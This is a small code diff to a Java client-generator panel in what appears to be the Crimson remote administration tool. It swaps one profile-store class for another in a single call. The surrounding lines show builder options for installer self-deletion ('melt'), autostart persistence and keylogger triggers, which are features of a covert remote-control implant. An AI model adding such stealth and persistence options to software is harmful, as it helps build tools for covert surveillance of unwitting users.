@@ -56,6 +56,7 @@ import javax.swing.border.EtchedBorder;
 import javax.swing.border.TitledBorder;
 
 import com.subterranean_security.crimson.core.attribute.keys.singular.AK_VIEWER;
+import com.subterranean_security.crimson.core.store.ProfileStore;
 import com.subterranean_security.crimson.core.util.RandomUtil;
 import com.subterranean_security.crimson.core.util.ValidationUtil;
 import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
@@ -63,7 +64,6 @@ import com.subterranean_security.crimson.proto.core.Generator.NetworkTarget;
 import com.subterranean_security.crimson.proto.core.Misc.AuthType;
 import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.Trigger;
 import com.subterranean_security.crimson.universal.Universal;
-import com.subterranean_security.crimson.viewer.store.ViewerProfileStore;
 import com.subterranean_security.crimson.viewer.ui.UICommon;
 import com.subterranean_security.crimson.viewer.ui.common.components.labels.StatusLabel;
 import com.subterranean_security.crimson.viewer.ui.common.panels.sl.epanel.EPanel;
@@ -581,7 +581,7 @@ public class GenPanel extends JPanel {
 
 		ic.setMelt(chckbxDeleteInstaller.isSelected());
 		ic.setAutostart(chckbxInstallAutostartModule.isSelected());
-		ic.setViewerUser(ViewerProfileStore.getLocalViewer().get(AK_VIEWER.USER));
+		ic.setViewerUser(ProfileStore.getLocalViewer().get(AK_VIEWER.USER));
 
 		ic.setDelay((int) fld_delay.getValue());
 		ic.setReconnectPeriod((int) ntab.fld_connect_period.getValue());
